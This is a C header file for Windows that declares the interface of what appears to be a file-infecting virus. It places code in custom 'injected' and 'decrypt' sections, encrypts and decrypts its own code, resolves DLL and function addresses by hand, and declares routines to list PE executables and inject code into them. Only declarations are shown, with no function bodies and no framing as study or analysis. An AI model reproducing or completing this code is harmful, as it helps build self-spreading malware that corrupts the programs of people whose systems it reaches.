#ifndef __LIBPROC_H
#define __LIBPROC_H

#ifdef DEBUG
#   define LOG(...) printf(__VA_ARGS__);
#else
#   define LOG(...) /**/
#endif

#include <windows.h>

#ifdef DEBUG
void        list_dll();
void        list_func(PVOID dllBase);
#endif

#pragma section ("injected", read, execute)

#pragma section ("decrypt", read, execute)

__declspec(code_seg("decrypt"))
VOID       decrypt(PVOID addr, DWORD size);

__declspec(code_seg("decrypt"))
VOID       encrypt(PVOID addr, DWORD size);

//__declspec(code_seg("injected"))
__declspec(code_seg("decrypt"))
PVOID       get_dll_d(PWSTR name);

//__declspec(code_seg("injected"))
__declspec(code_seg("decrypt"))
PVOID       get_func_d(PCHAR name, PVOID dllBase);

__declspec(code_seg("injected"))
PVOID       get_dll(PWSTR name);

__declspec(code_seg("injected"))
PVOID       get_func(PCHAR name, PVOID dllBase);

__declspec(code_seg("injected"))
void       inj_code_c();

__declspec(code_seg("injected"))
void list_pe_files_and_inject();

__declspec(code_seg("injected"))
int is_pe_file(LPCTSTR filename, PVOID dll);

__declspec(code_seg("injected"))
int injector(PVOID dll, char *thefile);
#endif
